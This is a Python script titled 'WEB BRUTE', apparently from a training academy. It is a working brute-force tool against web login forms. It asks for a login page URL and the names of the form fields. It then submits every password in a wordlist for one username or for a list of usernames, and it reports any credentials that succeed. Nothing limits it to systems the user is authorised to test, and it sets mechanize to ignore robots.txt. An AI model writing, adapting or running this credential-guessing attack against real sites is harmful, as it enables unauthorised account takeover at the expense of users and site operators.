import mechanize
import pyfiglet 

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
ascii_banner = pyfiglet.figlet_format("WEB BRUTE")
print(("\033[0;31;40m" +ascii_banner))
print("\033[1;33;40m \t|+++++++:Welcome To bruteforce tool:+++++++|\n")
print("\033[1;33;40m\t \t|+++++++:Cre8tor Academy:+++++++|\n")
url = str(input("\033[1;34;40m Enter Url Of Login Page: \033[1;32;40m"))
if len(url) > 0:
    br.open(url)
    input_fst = input(
        "\033[1;34;40m Please Enter Username Input Tag Name :\033[1;32;40m ")
    input_scnd = input(
        " \033[1;34;40m Please Enter Password Input Tag Name :\033[1;32;40m ")
    if len(input_fst) <= 0:
        print("\033[1;33;40m---------------------------------------------")
        print("|\t \033[1;31;40m Invalid Username Feild \033[1;33;40m  \t \t|")
        print("---------------------------------------------\033[0;37;40m ")
        exit()
    elif len(input_scnd) <= 0:
        print("\033[1;33;40m---------------------------------------------")
        print("|\t \033[1;31;40m Invalid Password Feild \033[1;33;40m \t \t|")
        print("---------------------------------------------\033[0;37;40m ")
        exit()
    else:
        test = input("You Know Username (y/n)")
        if test == "y":
            username = input("\033[1;34;40m Enter username: \033[1;32;40m")
            passlist = input("\033[1;34;40m Enter Password List Path Default (pass.txt Hit Enter) :\033[1;32;40m")
            if not passlist:
                combos = open("pass.txt", "r")
                data = combos.read().splitlines()
            else:
                combos = open(passlist, "r")
                data = combos.read().splitlines()
            for x in data:
                br.select_form(nr=0)
                br.form[''.join(input_fst)] = username
                br.form[''.join(input_scnd)] = x
                response = br.submit()
                if response.geturl() == url:
                    print((
                        "\033[1;33;40m Cracking |+| WRONG PASSWORD = \033[1;31;40m" + x))
                else:
                    print("\033[1;33;40m-----------------------------------------------------")
                    print(("\033[1;33;40m \t \t Correct password is = \033[1;32;40m" + x))
                    print("\033[1;33;40m-----------------------------------------------------\033[0;37;40m ")
                    break
                    exit()
        else:
            user_file = input("\033[1;34;40m Enter the path of Username File Default (users.txt):\033[1;32;40m ")
            passlist = input("\033[1;34;40m Enter Password List Path Default (pass.txt Hit Enter) :\033[1;32;40m")
            if not passlist:
                combos = open("pass.txt", "r")
                data = combos.read().splitlines()
            else:
                combos = open(passlist, "r")
                data = combos.read().splitlines()
            if not user_file:
                print("Taking Default")
                file = open ("users.txt", "r")
                usr_data = file.read().splitlines()
            else:
                print("Loading Users Files")
                file = open (user_file, "r")
                usr_data = file.read().splitlines()
            for y in usr_data:
                print((" \033[1;33;40mChenking User \033[1;31;40m" + y))    
                for x in data:
                    br.select_form(nr=0)
                    br.form[''.join(input_fst)] = y
                    br.form[''.join(input_scnd)] = x
                    response = br.submit()
                    if response.geturl() == url:
                        print((
                            "\033[1;33;40m Cracking |+| WRONG PASSWORD = \033[1;31;40m" + x + "\033[1;33;40m For Username = \033[1;31;40m" + y))
                    else:
                        print("\033[1;33;40m--------------------------------------------------------------------------------------------------------")
                        print(("\033[1;33;40m \t \t Correct password is = \033[1;32;40m" + x  + "\033[1;33;40m \t \t For Username = \033[1;32;40m" + y))
                        print("\033[1;33;40m--------------------------------------------------------------------------------------------------------\033[0;37;40m ")
                        break
            
            
else:
    print("\033[1;33;40m---------------------------------------------")
    print("|\t \t \033[1;31;40m Invalid URL \033[1;33;40m \t \t|")
    print("---------------------------------------------\033[0;37;40m ")
    exit()
